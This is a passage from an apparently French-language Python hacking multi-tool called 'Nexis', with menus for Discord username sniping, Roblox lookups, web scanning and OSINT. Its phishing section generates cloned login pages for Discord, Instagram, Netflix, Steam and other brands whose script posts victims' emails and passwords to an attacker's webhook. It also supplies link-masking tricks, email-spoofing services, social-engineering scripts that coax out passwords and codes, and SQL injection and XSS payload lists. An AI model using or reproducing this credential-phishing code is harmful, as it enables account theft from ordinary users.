                                        if any("taken" in msg.lower() or "déjà" in msg.lower() or "already" in msg.lower() for msg in error_msgs):
                                            print(f"  [X] {checked}/{total} {pseudo} - Pris")
                                        else:
                                            # Username disponible ou autre erreur
                                            print(f"  [OK] {checked}/{total} {pseudo} - DISPONIBLE!")
                                            trouves.append(pseudo)

                                            if webhook_url:
                                                try:
                                                    embed = {
                                                        "title": "PSEUDO 4C DISPONIBLE!",
                                                        "color": 3447003,
                                                        "fields": [
                                                            {"name": "Pseudo", "value": pseudo, "inline": True},
                                                            {"name": "Checked", "value": f"{checked}/{total}", "inline": True}
                                                        ],
                                                        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                                                        "footer": {"text": "Nexis 4C Gen - Pour mon LO"}
                                                    }
                                                    requests.post(webhook_url, json={
                                                        "username": "Nexis 4C Gen",
                                                        "content": "@everyone NOUVEAU PSEUDO 4C DISPONIBLE!",
                                                        "embeds": [embed]
                                                    }, timeout=10)
                                                    print(f"  [OK] Envoye au webhook!")
                                                except Exception as e:
                                                    print(f"  [!] Erreur webhook: {e}")
                                    else:
                                        # Pas d'erreur username = probablement disponible
                                        print(f"  [OK] {checked}/{total} {pseudo} - DISPONIBLE!")
                                        trouves.append(pseudo)

                                        if webhook_url:
                                            try:
                                                embed = {
                                                    "title": "PSEUDO 4C DISPONIBLE!",
                                                    "color": 3447003,
                                                    "fields": [
                                                        {"name": "Pseudo", "value": pseudo, "inline": True},
                                                        {"name": "Checked", "value": f"{checked}/{total}", "inline": True}
                                                    ],
                                                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                                                    "footer": {"text": "Nexis 4C Gen - Pour mon LO"}
                                                }
                                                requests.post(webhook_url, json={
                                                    "username": "Nexis 4C Gen",
                                                    "content": "@everyone NOUVEAU PSEUDO 4C DISPONIBLE!",
                                                    "embeds": [embed]
                                                }, timeout=10)
                                                print(f"  [OK] Envoye au webhook!")
                                            except Exception as e:
                                                print(f"  [!] Erreur webhook: {e}")
                                else:
                                    print(f"  [?] {checked}/{total} {pseudo} - Status {r.status_code}")

                            except Exception as e:
                                print(f"  [X] {checked}/{total} {pseudo} - Erreur: {str(e)[:50]}")

                            time.sleep(0.3)

        except KeyboardInterrupt:
            print("\n  [!] Arrete par utilisateur")

    elif mode == "3":
        while True:
            try:
                count = int(input("  Nombre de pseudos a generer: ").strip())
                if count > 0: break
                print("  [!] Superieur a 0!")
            except:
                print("  [!] Nombre entier!")

        print(f"\n  [*] Generation de {count} pseudos aleatoires...\n")

        checked = 0

        for i in range(count):
            pseudo = ''.join(random.choice(chars) for _ in range(4))
            checked += 1

            try:
                r = requests.post(
                    "https://discord.com/api/v9/auth/register",
                    headers=HEADERS_DISCORD,
                    json={"username": pseudo, "password": "dummy123!", "email": "dummy@test.com", "date_of_birth": "1990-01-01"},
                    timeout=5
                )

                if r.status_code == 400:
                    data = r.json()
                    errors = data.get("errors", {})
                    username_errors = errors.get("username", {})

                    if username_errors and "_errors" in username_errors:
                        error_msgs = [e.get("message", "") for e in username_errors["_errors"]]

                        if any("taken" in msg.lower() or "déjà" in msg.lower() or "already" in msg.lower() for msg in error_msgs):
                            print(f"  [X] {checked}/{count} {pseudo} - Pris")
                        else:
                            print(f"  [OK] {checked}/{count} {pseudo} - DISPONIBLE!")
                            trouves.append(pseudo)

                            if webhook_url:
                                try:
                                    embed = {
                                        "title": "PSEUDO 4C DISPONIBLE!",
                                        "color": 3447003,
                                        "fields": [
                                            {"name": "Pseudo", "value": pseudo, "inline": True},
                                            {"name": "Checked", "value": f"{checked}/{count}", "inline": True}
                                        ],
                                        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                                        "footer": {"text": "Nexis 4C Gen - Pour mon LO"}
                                    }
                                    requests.post(webhook_url, json={
                                        "username": "Nexis 4C Gen",
                                        "content": "@everyone NOUVEAU PSEUDO 4C DISPONIBLE!",
                                        "embeds": [embed]
                                    }, timeout=10)
                                    print(f"  [OK] Envoye au webhook!")
                                except Exception as e:
                                    print(f"  [!] Erreur webhook: {e}")
                    else:
                        print(f"  [OK] {checked}/{count} {pseudo} - DISPONIBLE!")
                        trouves.append(pseudo)

                        if webhook_url:
                            try:
                                embed = {
                                    "title": "PSEUDO 4C DISPONIBLE!",
                                    "color": 3447003,
                                    "fields": [
                                        {"name": "Pseudo", "value": pseudo, "inline": True},
                                        {"name": "Checked", "value": f"{checked}/{count}", "inline": True}
                                    ],
                                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                                    "footer": {"text": "Nexis 4C Gen - Pour mon LO"}
                                }
                                requests.post(webhook_url, json={
                                    "username": "Nexis 4C Gen",
                                    "content": "@everyone NOUVEAU PSEUDO 4C DISPONIBLE!",
                                    "embeds": [embed]
                                }, timeout=10)
                                print(f"  [OK] Envoye au webhook!")
                            except Exception as e:
                                print(f"  [!] Erreur webhook: {e}")
                else:
                    print(f"  [?] {checked}/{count} {pseudo} - Status {r.status_code}")

            except Exception as e:
                print(f"  [X] {checked}/{count} {pseudo} - Erreur: {str(e)[:50]}")

            time.sleep(0.3)

    else:
        print("  [!] Mode invalide!")
        pause()
        return

    print(f"\n  [OK] Termine! {len(trouves)} pseudos disponibles trouves.")

    if trouves:
        try:
            os.makedirs("Nexis_Output", exist_ok=True)
            path = os.path.join("Nexis_Output", "4c_disponibles.txt")
            with open(path, "w") as f:
                for p in trouves:
                    f.write(f"{p}\n")
            print(f"  [OK] Sauvegarde: {path}")
        except Exception as e:
            print(f"  [!] Erreur sauvegarde: {e}")

    pause()

# ============================================================
# 4. ROBLOX TOOLS
# ============================================================

def roblox_menu():
    while True:
        clear()
        print("=" * 60)
        print("     ROBLOX TOOLS")
        print("=" * 60)
        print()
        print("  [1]  Profile Lookup - Info utilisateur")
        print("  [2]  User ID Lookup - ID par username")
        print("  [3]  Friends List - Liste d'amis")
        print("  [4]  Avatar Lookup - Avatar URL")
        print("  [5]  Group Lookup - Info groupe")
        print("  [6]  Asset Info - Info asset")
        print("  [0]  RETOUR")
        print()
        choix = input("  Choix: ").strip()
        if choix == "1": roblox_profile_lookup()
        elif choix == "2": roblox_user_id_lookup()
        elif choix == "3": roblox_friends_list()
        elif choix == "4": roblox_avatar_lookup()
        elif choix == "5": roblox_group_lookup()
        elif choix == "6": roblox_asset_info()
        elif choix == "0": break

def roblox_profile_lookup():
    clear()
    print("=" * 60)
    print("     PROFILE LOOKUP")
    print("=" * 60)
    print()
    user_id = input("  User ID: ").strip()
    try:
        r = requests.get(ROBLOX_API + "/users/" + user_id, timeout=10)
        if r.status_code == 200:
            d = r.json()
            print("\n  [OK] TROUVE!")
            print("  Name: " + d.get("name","N/A"))
            print("  Display: " + d.get("displayName","N/A"))
            print("  ID: " + str(d.get("id","N/A")))
            print("  Description: " + str(d.get("description","N/A"))[:100])
            print("  Created: " + str(d.get("created","N/A")))
            print("  Banned: " + ("Oui" if d.get("isBanned") else "Non"))
        else: print(f"\n  [!] Erreur: {r.status_code}")
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

def roblox_user_id_lookup():
    clear()
    print("=" * 60)
    print("     USER ID LOOKUP")
    print("=" * 60)
    print()
    username = input("  Username: ").strip()
    try:
        r = requests.post(ROBLOX_API + "/usernames/users", json={"usernames":[username],"excludeBannedUsers":False}, timeout=10)
        if r.status_code == 200:
            d = r.json()
            if d.get("data"):
                u = d["data"][0]
                print("\n  [OK] TROUVE!")
                print("  Username: " + u.get("name","N/A"))
                print("  ID: " + str(u.get("id","N/A")))
                print("  Display: " + u.get("displayName","N/A"))
            else: print("\n  [!] Utilisateur non trouve!")
        else: print(f"\n  [!] Erreur: {r.status_code}")
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

def roblox_friends_list():
    clear()
    print("=" * 60)
    print("     FRIENDS LIST")
    print("=" * 60)
    print()
    user_id = input("  User ID: ").strip()
    try:
        r = requests.get(f"https://friends.roblox.com/v1/users/{user_id}/friends", timeout=10)
        if r.status_code == 200:
            d = r.json()
            friends = d.get("data",[])
            print(f"\n  [OK] {len(friends)} amis trouves!")
            for i, f in enumerate(friends[:20]):
                print(f"  {i+1}. {f.get('name','N/A')} (ID: {f.get('id','N/A')})")
            if len(friends) > 20: print(f"  ... et {len(friends)-20} autres")
        else: print(f"\n  [!] Erreur: {r.status_code}")
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

def roblox_avatar_lookup():
    clear()
    print("=" * 60)
    print("     AVATAR LOOKUP")
    print("=" * 60)
    print()
    user_id = input("  User ID: ").strip()
    try:
        r = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={user_id}&size=420x420&format=Png&isCircular=false", timeout=10)
        if r.status_code == 200:
            d = r.json()
            if d.get("data"):
                url = d["data"][0].get("imageUrl","N/A")
                print(f"\n  [OK] Avatar URL: {url}")
            else: print("\n  [!] Avatar non trouve")
        else: print(f"\n  [!] Erreur: {r.status_code}")
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

def roblox_group_lookup():
    clear()
    print("=" * 60)
    print("     GROUP LOOKUP")
    print("=" * 60)
    print()
    group_id = input("  Group ID: ").strip()
    try:
        r = requests.get(f"https://groups.roblox.com/v1/groups/{group_id}", timeout=10)
        if r.status_code == 200:
            d = r.json()
            print("\n  [OK] TROUVE!")
            print("  Name: " + d.get("name","N/A"))
            print("  ID: " + str(d.get("id","N/A")))
            print("  Description: " + str(d.get("description","N/A"))[:100])
            print("  Owner: " + str(d.get("owner",{}).get("username","N/A")))
            print("  Members: " + str(d.get("memberCount","N/A")))
        else: print(f"\n  [!] Erreur: {r.status_code}")
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

def roblox_asset_info():
    clear()
    print("=" * 60)
    print("     ASSET INFO")
    print("=" * 60)
    print()
    asset_id = input("  Asset ID: ").strip()
    try:
        r = requests.get(f"https://economy.roblox.com/v2/assets/{asset_id}/details", timeout=10)
        if r.status_code == 200:
            d = r.json()
            print("\n  [OK] TROUVE!")
            print("  Name: " + d.get("Name","N/A"))
            print("  ID: " + str(d.get("AssetId","N/A")))
            print("  Type: " + str(d.get("AssetTypeId","N/A")))
            print("  Creator: " + str(d.get("Creator",{}).get("Name","N/A")))
            print("  Price: " + str(d.get("PriceInRobux","N/A")) + " Robux")
        else: print(f"\n  [!] Erreur: {r.status_code}")
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

# ============================================================
# 5. PHISHING TOOLS
# ============================================================

def phishing_menu():
    while True:
        clear()
        print("=" * 60)
        print("     PHISHING TOOLS")
        print("=" * 60)
        print()
        print("  [1]  Generateur de page phishing (8 templates)")
        print("  [2]  Generateur de lien court (masking)")
        print("  [3]  Email Spoofer - Info headers")
        print("  [4]  Social Engineering - Scripts prets")
        print("  [0]  RETOUR")
        print()
        choix = input("  Choix: ").strip()
        if choix == "1": phishing_generator()
        elif choix == "2": phishing_link_mask()
        elif choix == "3": phishing_email_spoof()
        elif choix == "4": phishing_se_scripts()
        elif choix == "0": break

def phishing_generator():
    clear()
    print("=" * 60)
    print("     GENERATEUR DE PAGE PHISHING")
    print("=" * 60)
    print()
    for key, cfg in PHISHING_TEMPLATES.items():
        print(f"  [{key}]  {cfg['name']}")
    print("  [0]  RETOUR")
    print()
    choice = input("  Template: ").strip()
    if choice == "0" or choice not in PHISHING_TEMPLATES: return

    cfg = PHISHING_TEMPLATES[choice]
    webhook = input("  Webhook URL (pour recevoir les creds): ").strip()

    html_content = generate_phishing_html(cfg["brand"], cfg["title"], webhook)

    try:
        os.makedirs("Nexis_Output/phishing", exist_ok=True)
        filename = cfg["brand"] + "_login.html"
        path = os.path.join("Nexis_Output/phishing", filename)
        with open(path, "w", encoding="utf-8") as f:
            f.write(html_content)
        print(f"\n  [OK] Page generee: {path}")
        print(f"  [*] Ouvre ce fichier dans un navigateur")
        print(f"  [*] Les credentials seront envoyes au webhook")
    except Exception as e:
        print(f"\n  [!] Erreur: {e}")
    pause()

def generate_phishing_html(brand, title, webhook):
    logos = {
        "discord": "https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png",
        "instagram": "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png",
        "facebook": "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png",
        "netflix": "https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Netflix_2015_logo.svg/2560px-Netflix_2015_logo.svg.png",
        "steam": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/2048px-Steam_icon_logo.svg.png",
        "roblox": "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Roblox_logo.svg/2560px-Roblox_logo.svg.png",
        "tiktok": "https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/2560px-TikTok_logo.svg.png",
        "snapchat": "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1024px-Snapchat_logo.svg.png",
    }
    logo = logos.get(brand, "")

    html = '<!DOCTYPE html>\n<html>\n<head>\n'
    html += '    <meta charset="UTF-8">\n'
    html += '    <title>' + title + '</title>\n'
    html += '    <style>\n'
    html += '        body { font-family: Arial, sans-serif; background: #36393f; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }\n'
    html += '        .container { background: #2f3136; padding: 40px; border-radius: 8px; width: 400px; text-align: center; }\n'
    html += '        .logo { width: 80px; margin-bottom: 20px; }\n'
    html += '        h2 { margin-bottom: 20px; }\n'
    html += '        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #202225; border-radius: 4px; background: #202225; color: #fff; box-sizing: border-box; }\n'
    html += '        button { width: 100%; padding: 12px; margin-top: 15px; background: #5865f2; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }\n'
    html += '        button:hover { background: #4752c4; }\n'
    html += '        .footer { margin-top: 20px; font-size: 12px; color: #72767d; }\n'
    html += '    </style>\n'
    html += '</head>\n<body>\n'
    html += '    <div class="container">\n'
    html += '        <img src="' + logo + '" class="logo" alt="logo">\n'
    html += '        <h2>' + title + '</h2>\n'
    html += '        <form onsubmit="handleSubmit(event)">\n'
    html += '            <input type="text" id="email" placeholder="Email" required>\n'
    html += '            <input type="password" id="password" placeholder="Password" required>\n'
    html += '            <button type="submit">Log In</button>\n'
    html += '        </form>\n'
    html += '        <div class="footer">Secured by ' + brand.title() + '</div>\n'
    html += '    </div>\n'
    html += '    <script>\n'
    html += '        function handleSubmit(e) {\n'
    html += '            e.preventDefault();\n'
    html += '            var email = document.getElementById(\'email\').value;\n'
    html += '            var password = document.getElementById(\'password\').value;\n'
    html += '            fetch(\'' + webhook + '\', {\n'
    html += '                method: \'POST\',\n'
    html += '                headers: {\'Content-Type\': \'application/json\'},\n'
    html += '                body: JSON.stringify({\n'
    html += '                    username: \'Nexis Phish - ' + brand.title() + '\',\n'
    html += '                    content: \'**New Capture!**\\n\\n**Email:** `\' + email + \'`\\n**Password:** `\' + password + \'`\\n**IP:** \' + window.location.href\n'
    html += '                })\n'
    html += '            });\n'
    html += '            setTimeout(function() {\n'
    html += '                alert(\'Login failed. Please try again.\');\n'
    html += '                document.getElementById(\'email\').value = \'\';\n'
    html += '                document.getElementById(\'password\').value = \'\';\n'
    html += '            }, 500);\n'
    html += '        }\n'
    html += '    </script>\n'
    html += '</body>\n</html>'
    return html

def phishing_link_mask():
    clear()
    print("=" * 60)
    print("     LINK MASKING")
    print("=" * 60)
    print()
    real_url = input("  URL reelle (ta page phishing): ").strip()
    mask_domain = input("  Domaine masque (ex: discord.com): ").strip() or "discord.com"
    print(f"\n  [OK] LIEN MASQUE:")
    print(f"  {mask_domain}@{real_url.replace('https://','').replace('http://','')}")
    print(f"\n  [*] Raccourcisseurs:")
    print(f"  - https://bit.ly")
    print(f"  - https://tinyurl.com")
    print(f"  - https://is.gd")
    pause()

def phishing_email_spoof():
    clear()
    print("=" * 60)
    print("     EMAIL SPOOFER INFO")
    print("=" * 60)
    print()
    print("  [*] Services gratuits:")
    print("  1. https://emkei.cz")
    print("  2. https://anonymousemail.me")
    print("  3. https://www.guerrillamail.com")
    print()
    print("  [*] Headers a verifier:")
    print("  - Received: trace le chemin")
    print("  - X-Originating-IP: IP expediteur")
    print("  - Return-Path: adresse retour")
    print("  - X-Mailer: logiciel utilise")
    print()
    print("  [*] Analyse d'email:")
    print("  - https://mxtoolbox.com/EmailHeaders.aspx")
    print("  - https://toolbox.googleapps.com/apps/messageheader/")
    pause()

def phishing_se_scripts():
    clear()
    print("=" * 60)
    print("     SOCIAL ENGINEERING SCRIPTS")
    print("=" * 60)
    print()
    print("  [1] Pretexte Support Technique")
    print("  [2] Pretexte Verification Securite")
    print("  [3] Pretexte Concours/Gain")
    print("  [4] Pretexte Ami/Connaissance")
    print()
    choix = input("  Choix: ").strip()

    scripts = {
        "1": "PRETEXTE: Support Technique\n\nBonjour, je suis [NOM] du support de [PLATEFORME].\nNous avons detecte une activite suspecte sur votre compte.\nPour verifier votre identite, confirmez:\n- Votre email\n- Votre mot de passe\n- Le code de verification\n\nUrgent, suspension dans 24h.",
        "2": "PRETEXTE: Verification Securite\n\nAlerte! Connexion inhabituelle depuis [PAYS].\nVerifiez votre identite sur:\n[LIEN PHISHING]\nEntrez vos identifiants pour confirmer.",
        "3": "PRETEXTE: Concours/Gain\n\nFELICITATIONS! Vous avez gagne [PRIX]!\nReclamez sur:\n[LIEN PHISHING]\nConnectez-vous pour verifier et recevoir sous 24h!",
        "4": "PRETEXTE: Ami/Connaissance\n\nHey c'est [NOM]! Nouveau compte.\nJ'ai trouve un truc genial:\n[LIEN PHISHING]\nFaut se connecter pour voir, c'est trop bien!",
    }

    if choix in scripts:
        print("\n" + "=" * 60)
        print(scripts[choix])
        print("=" * 60)
        save = input("\n  Sauvegarder? (o/n): ").strip().lower()
        if save == "o":
            try:
                os.makedirs("Nexis_Output", exist_ok=True)
                with open(f"Nexis_Output/se_script_{choix}.txt", "w") as f:
                    f.write(scripts[choix])
                print("  [OK] Sauvegarde effectuee!")
            except Exception as e:
                print(f"  [!] Erreur: {e}")
    pause()

# ============================================================
# 6. WEB TOOLS
# ============================================================

def web_menu():
    while True:
        clear()
        print("=" * 60)
        print("     WEB TOOLS")
        print("=" * 60)
        print()
        print("  [1]  HTTP Request - Requete custom")
        print("  [2]  Headers Check - Verifier headers")
        print("  [3]  Status Check - Status site")
        print("  [4]  Subdomain Scan - Scan sous-domaines")
        print("  [5]  Directory Scan - Scan directories")
        print("  [6]  Port Scan - Scan ports")
        print("  [7]  SQLi Test - Test SQL injection")
        print("  [8]  XSS Test - Test XSS")
        print("  [0]  RETOUR")
        print()
        choix = input("  Choix: ").strip()
        if choix == "1": web_http_request()
        elif choix == "2": web_headers_check()
        elif choix == "3": web_status_check()
        elif choix == "4": web_subdomain_scan()
        elif choix == "5": web_directory_scan()
        elif choix == "6": web_port_scan()
        elif choix == "7": web_sqli_test()
        elif choix == "8": web_xss_test()
        elif choix == "0": break

def web_http_request():
    clear()
    print("=" * 60)
    print("     HTTP REQUEST")
    print("=" * 60)
    print()
    url = input("  URL: ").strip()
    method = input("  Methode (GET/POST/PUT/DELETE/PATCH): ").strip().upper() or "GET"
    headers_input = input("  Headers JSON (optionnel): ").strip()
    headers = {}
    if headers_input:
        try: headers = json.loads(headers_input)
        except: print("  [!] Headers invalides")
    data_input = input("  Data JSON (optionnel): ").strip()
    data = None
    if data_input:
        try: data = json.loads(data_input)
        except: print("  [!] Data invalide")
    try:
        if method == "GET": r = requests.get(url, headers=headers, timeout=15)
        elif method == "POST": r = requests.post(url, headers=headers, json=data, timeout=15)
        elif method == "PUT": r = requests.put(url, headers=headers, json=data, timeout=15)
        elif method == "DELETE": r = requests.delete(url, headers=headers, timeout=15)
        elif method == "PATCH": r = requests.patch(url, headers=headers, json=data, timeout=15)
        else: r = requests.get(url, headers=headers, timeout=15)
        print(f"\n  [OK] Status: {r.status_code}")
        print("  Headers:")
        for k, v in r.headers.items(): print(f"    {k}: {v}")
        print(f"\n  Body (200 chars):\n  {r.text[:200].replace(chr(10), chr(10)+'  ')}")
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

def web_headers_check():
    clear()
    print("=" * 60)
    print("     HEADERS CHECK")
    print("=" * 60)
    print()
    url = input("  URL: ").strip()
    try:
        r = requests.get(url, timeout=10)
        print("\n  [OK] HEADERS:")
        for k, v in r.headers.items(): print(f"  {k}: {v}")
        sec = ["X-Frame-Options","X-Content-Type-Options","X-XSS-Protection","Content-Security-Policy","Strict-Transport-Security","Referrer-Policy"]
        print("\n  [*] Security Headers:")
        for h in sec: print(f"  {'[OK]' if h in r.headers else '[X]'} {h}: {'Present' if h in r.headers else 'Manquant'}")
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

def web_status_check():
    clear()
    print("=" * 60)
    print("     STATUS CHECK")
    print("=" * 60)
    print()
    url = input("  URL: ").strip()
    try:
        r = requests.get(url, timeout=10)
        print(f"\n  [OK] Status: {r.status_code}")
        if r.status_code == 200: print("  Site: EN LIGNE")
        elif r.status_code in [301,302]: print(f"  Site: REDIRECTION -> {r.headers.get('Location','Inconnu')}")
        elif r.status_code == 403: print("  Site: FORBIDDEN")
        elif r.status_code == 404: print("  Site: NON TROUVE")
        elif r.status_code >= 500: print("  Site: ERREUR SERVEUR")
        print(f"  Temps: {r.elapsed.total_seconds()}s")
        print(f"  Taille: {len(r.content)} bytes")
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

def web_subdomain_scan():
    clear()
    print("=" * 60)
    print("     SUBDOMAIN SCAN")
    print("=" * 60)
    print()
    domain = input("  Domaine: ").strip()
    subs = ["www","mail","ftp","admin","api","blog","shop","dev","test","staging","panel","cpanel","webmail","ns1","ns2","m","mobile","app","portal","secure","vpn","remote","cdn","img","static","assets"]
    print(f"\n  [*] Scan de {len(subs)} sous-domaines...")
    trouves = []
    for sub in subs:
        try:
            full = sub + "." + domain
            ip = socket.gethostbyname(full)
            print(f"  [OK] {full} -> {ip}")
            trouves.append((full, ip))
        except: pass
    print(f"\n  [OK] {len(trouves)} sous-domaines trouves!")
    if trouves:
        save = input("  Sauvegarder? (o/n): ").strip().lower()
        if save == "o":
            with open(f"subdomains_{domain.replace('.','_')}.txt","w") as f:
                for s, ip in trouves: f.write(f"{s} -> {ip}\n")
            print("  [OK] Sauvegarde effectuee!")
    pause()

def web_directory_scan():
    clear()
    print("=" * 60)
    print("     DIRECTORY SCAN")
    print("=" * 60)
    print()
    url = input("  URL base: ").strip()
    dirs = ["admin","login","dashboard","panel","api","config","backup","wp-admin","phpmyadmin","test","dev","staging","uploads","images","css","js","robots.txt",".env",".git",".htaccess","phpinfo.php","admin.php","login.php"]
    print(f"\n  [*] Scan de {len(dirs)} directories...")
    trouves = []
    for d in dirs:
        try:
            full = url.rstrip("/") + "/" + d
            r = requests.get(full, timeout=5, allow_redirects=False)
            if r.status_code != 404:
                print(f"  [OK] {full} -> {r.status_code}")
                trouves.append((full, r.status_code))
        except: pass
    print(f"\n  [OK] {len(trouves)} directories trouves!")
    pause()

def web_port_scan():
    clear()
    print("=" * 60)
    print("     PORT SCAN")
    print("=" * 60)
    print()
    target = input("  IP ou domaine: ").strip()
    try: ip = socket.gethostbyname(target)
    except: print("  [!] Impossible de resoudre!"); pause(); return
    ports_str = input("  Ports (ex: 21,22,80,443 ou 1-1000): ").strip() or "21,22,23,25,53,80,110,143,443,445,3306,3389,5432,8080,8443,8888,9000"
    ports = []
    if "-" in ports_str:
        start, end = ports_str.split("-")
        ports = list(range(int(start), int(end)+1))
    else:
        ports = [int(p.strip()) for p in ports_str.split(",")]
    print(f"\n  [*] Scan de {ip} sur {len(ports)} ports...")
    ouverts = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if s.connect_ex((ip, port)) == 0:
                try: service = socket.getservbyport(port, "tcp")
                except: service = "?"
                print(f"  [OK] Port {port} ouvert ({service})")
                ouverts.append((port, service))
            s.close()
        except: pass
    print(f"\n  [OK] {len(ouverts)} ports ouverts!")
    if ouverts:
        save = input("  Sauvegarder? (o/n): ").strip().lower()
        if save == "o":
            with open(f"ports_{ip.replace('.','_')}.txt","w") as f:
                for p, s in ouverts: f.write(f"{p} -> {s}\n")
            print("  [OK] Sauvegarde effectuee!")
    pause()

def web_sqli_test():
    clear()
    print("=" * 60)
    print("     SQL INJECTION TEST")
    print("=" * 60)
    print()
    url = input("  URL (ex: http://site.com/page?id=1): ").strip()
    payloads = ["'","''","' OR '1'='1","' OR 1=1--","' UNION SELECT NULL--","1' AND 1=1--","1' AND 1=2--"]
    print(f"\n  [*] Test en cours...")
    for payload in payloads:
        try:
            test_url = url + payload if "?" in url else url + "?id=" + payload
            r = requests.get(test_url, timeout=10)
            errors = ["sql","mysql","syntax","error","odbc","oracle","sqlite"]
            if any(e in r.text.lower() for e in errors):
                print(f"  [!] VULNERABLE! Payload: {payload}")
            else:
                print(f"  [OK] Payload teste: {payload[:30]}...")
        except Exception as e: print(f"  [X] Erreur: {e}")
    print(f"\n  [OK] Test termine!")
    pause()

def web_xss_test():
    clear()
    print("=" * 60)
    print("     XSS TEST")
    print("=" * 60)
    print()
    url = input("  URL (avec parametre): ").strip()
    payloads = ["<script>alert(1)</script>","<img src=x onerror=alert(1)>","<svg onload=alert(1)>","javascript:alert(1)","<body onload=alert(1)>"]
    print(f"\n  [*] Test en cours...")
    for payload in payloads:
        try:
            test_url = url + payload if "?" in url else url + "?q=" + payload
            r = requests.get(test_url, timeout=10)
            if payload in r.text:
                print(f"  [!] VULNERABLE! Payload: {payload[:30]}")
            else:
                print(f"  [OK] Payload teste: {payload[:30]}...")
        except Exception as e: print(f"  [X] Erreur: {e}")
    print(f"\n  [OK] Test termine!")
    pause()

# ============================================================
# 7. OSINT TOOLS
# ============================================================

def osint_menu():
    while True:
        clear()
        print("=" * 60)
        print("     OSINT TOOLS")
        print("=" * 60)
        print()
        print("  [1]  IP Lookup - Geolocalisation")
        print("  [2]  Email Lookup - Verifier email")
        print("  [3]  Phone Lookup - Info telephone")
        print("  [4]  Domain Info - Info domaine")
        print("  [5]  URL Expander - Decomposer URL")
        print("  [0]  RETOUR")
        print()
        choix = input("  Choix: ").strip()
        if choix == "1": osint_ip_lookup()
        elif choix == "2": osint_email_lookup()
        elif choix == "3": osint_phone_lookup()
        elif choix == "4": osint_domain_info()
        elif choix == "5": osint_url_expander()
        elif choix == "0": break

def osint_ip_lookup():
    clear()
    print("=" * 60)
    print("     IP LOOKUP")
    print("=" * 60)
    print()
    ip = input("  IP: ").strip()
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success":
                print(f"\n  [OK] IP TROUVE!")
                print(f"  IP: {d.get('query','N/A')}")
                print(f"  Pays: {d.get('country','N/A')} ({d.get('countryCode','N/A')})")
                print(f"  Region: {d.get('regionName','N/A')}")
                print(f"  Ville: {d.get('city','N/A')}")
                print(f"  ZIP: {d.get('zip','N/A')}")
                print(f"  Lat: {d.get('lat','N/A')}")
                print(f"  Lon: {d.get('lon','N/A')}")
                print(f"  Timezone: {d.get('timezone','N/A')}")
                print(f"  ISP: {d.get('isp','N/A')}")
                print(f"  Org: {d.get('org','N/A')}")
            else: print(f"\n  [!] Echec: {d.get('message','N/A')}")
        else: print(f"\n  [!] Erreur: {r.status_code}")
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

def osint_email_lookup():
    clear()
    print("=" * 60)
    print("     EMAIL LOOKUP")
    print("=" * 60)
    print()
    email = input("  Email: ").strip()
    if "@" not in email or "." not in email: print("  [!] Format invalide!"); pause(); return
    print(f"\n  [*] Verification...")
    print(f"  Format: OK")
    print(f"  Domaine: {email.split('@')[1]}")
    try:
        socket.gethostbyname(email.split('@')[1])
        print("  Domaine DNS: OK")
    except: print("  Domaine DNS: INCONNU")
    print(f"\n  [OK] Verification terminee!")
    pause()

def osint_phone_lookup():
    clear()
    print("=" * 60)
    print("     PHONE LOOKUP")
    print("=" * 60)
    print()
    phone = input("  Numero (ex: +33612345678): ").strip()
    print(f"\n  [*] Analyse...")
    print(f"  Numero: {phone}")
    if phone.startswith("+"):
        cc = phone[1:3] if len(phone) > 3 else "?"
        print(f"  Indicatif: +{cc}")
        cmap = {"1":"USA/Canada","33":"France","34":"Espagne","39":"Italie","44":"UK","49":"Allemagne","81":"Japon","86":"Chine","7":"Russie","91":"Inde","55":"Bresil","52":"Mexique"}
        print(f"  Pays: {cmap.get(cc,'Inconnu')}")
    print(f"\n  [OK] Analyse terminee!")
    pause()

def osint_domain_info():
    clear()
    print("=" * 60)
    print("     DOMAIN INFO")
    print("=" * 60)
    print()
    domain = input("  Domaine: ").strip()
    try:
        ip = socket.gethostbyname(domain)
        print(f"\n  [OK] TROUVE!")
        print(f"  IP: {ip}")
        try:
            r = requests.get(f"http://{domain}", timeout=10)
            print(f"  HTTP: {r.status_code}")
            print(f"  Server: {r.headers.get('Server','N/A')}")
        except: pass
        try:
            r = requests.get(f"https://{domain}", timeout=10, verify=False)
            print(f"  HTTPS: {r.status_code}")
        except: pass
    except Exception as e: print(f"\n  [!] Erreur: {e}")
    pause()

def osint_url_expander():
    clear()
    print("=" * 60)
    print("     URL EXPANDER")
    print("=" * 60)
    print()
    url = input("  URL courte: ").strip()
    try:
